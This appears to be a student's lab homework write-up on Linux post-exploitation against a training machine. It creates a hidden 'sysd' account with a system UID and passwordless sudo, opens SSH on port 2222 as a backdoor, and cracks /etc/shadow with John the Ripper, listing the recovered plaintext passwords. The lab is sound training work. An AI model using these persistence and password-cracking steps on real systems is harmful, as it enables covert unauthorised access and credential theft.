## Week 6 - Advanced Bash 

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
```bash
useradd sysd
```
Give your secret user a password.
```bash
passwd sysd
```
*the password is "thecoolest"

Give your secret user a system UID < 1000.
```bash
usermod -u 990 sysd
```
Give your secret user the same GID
```bash
groupmod -g 990 sysd
```
Give your secret user full sudo access without the need for a password.
- `sudo visudo`
```bash
sysd ALL=(ALL) NOPASSWD:ALL
#I edited the sudoers file.
```

Test that sudo access works without your password

```bash
sudo -l #it worked!
sudo apt install tree
sudo -V
```

## Allow ssh access over port 2222.

Command to edit the `sshd_config` file:

```bash
sudo nano /etc/ssh/sshd_config
```

Command to restart the ssh service:
```bash
systemctl restart ssh
```
Exit the root account:
```bash
exit #to log out of root account
exit #to log out of target machine
```
SSH to the target machine using your `sysd` account and port 2222:
```bash
ssh sysd@192.168.0.11 -p 2222
```
Use sudo to switch to the root user
```bash
sudo su
```
## Crack _all_ the passwords

Ssh back to the system using your sysd account
```bash
ssh sysd@192.168.0.11 -p 2222
```

- Use John to crack the entire /etc/shadow file
```bash
john /etc/shadow --show
sysadmin:passw0rd:18387:0:99999:7:::
student:Goodluck!:18387:0:99999:7:::
mitnik:trustno1:18387:0:99999:7:::
babbage:freedom:18387:0:99999:7:::
lovelace:dragon:18387:0:99999:7:::
stallman:computer:18387:0:99999:7:::
turing:lakers:18387:0:99999:7:::
#my password for sysd was taking forever to crack, but I already know what it is: thecoolest
```
